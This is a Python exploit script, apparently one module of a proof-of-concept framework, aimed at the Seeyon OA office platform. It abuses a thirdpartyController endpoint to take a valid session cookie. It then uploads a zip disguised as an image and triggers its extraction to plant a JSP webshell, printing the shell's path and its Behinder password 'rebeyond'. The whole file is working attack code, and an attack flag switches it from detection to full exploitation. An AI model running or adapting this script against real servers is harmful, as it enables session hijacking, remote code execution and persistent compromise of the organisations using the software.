# -*- coding: utf-8 -*- 

import requests
import re
import time
from poc import core

def get_session(url,attack):
	name='session泄露&&文件上传getshell'
	core.start_echo(name)
	path='/seeyon/thirdpartyController.do'
	header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
	data="method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
	r=core.post(url,path,header,data)
	if r:
		if r.status_code==200 and "a8genius.do" in r.text and 'set-cookie' in str(r.headers).lower():
			cookies = requests.utils.dict_from_cookiejar(r.cookies)
			cookie = cookies['JSESSIONID']
			if attack:
				print('\033[32m[#]成功获取到session：\033[0m'.format(cookie))
				fileUpload(url,cookie,name)
			else:
				core.end_echo(name,'session:'+cookie)
				core.result(name,url+path,'JSESSIONID='+cookie)
		else:
			core.end_echo(name)
	else:
		core.end_echo(name)
def fileUpload(url,cookie,name):
	path='/seeyon/fileUpload.do?method=processUpload'
	print('\033[32m[#]开始上传\033[0m')
	files = [('file1', ('test.png', open('poc/TEST233.zip', 'rb'), 'image/png'))]
	header={'Cookie':'JSESSIONID=%s'%cookie}
	data={'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0','isEncrypt': "0"}
	r=core.post(url,path,header,data,files)
	if r:
		firename=re.findall('fileurls=fileurls\+","\+\'(.+)\'',r.text,re.I)
		if len(firename)==0:
			print('\033[34m[#]上传失败\033[0m')
			print('\033[34m---------------------------------------------------\033[0m')
		else:
			print('\033[32m[#]上传成功\033[0m')
			unzip(header,url,firename,cookie,name)

def unzip(header,url,firename,cookie,name):
	path='/seeyon/ajax.do'
	nowtime=time.strftime('%Y-%m-%d')
	data='method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + nowtime + '%22%2C%22' + firename[0] + '%22%5D'
	header['Content-Type']='application/x-www-form-urlencoded'
	print('\033[32m[#]开始解压\033[0m')
	r=core.post(url,path,header,data)
	if r.status_code == 500:
		print('\033[32m[#]解压成功\033[0m')
		print('\033[32m[#]webshell地址为：{}/seeyon/common/designer/pageLayout/test233.jsp\033[0m'.format(url))
		print('\033[32m[#]冰蝎密码为：rebeyond\033[0m')
		print('\033[34m---------------------------------------------------\033[0m')
		core.result(name,url+'/seeyon/common/designer/pageLayout/test233.jsp','rebeyond	'+'JSESSIONID=%s'%cookie)
	else:
		print('\033[34m[#]解压失败\033[0m')
		print('\033[34m---------------------------------------------------\033[0m')
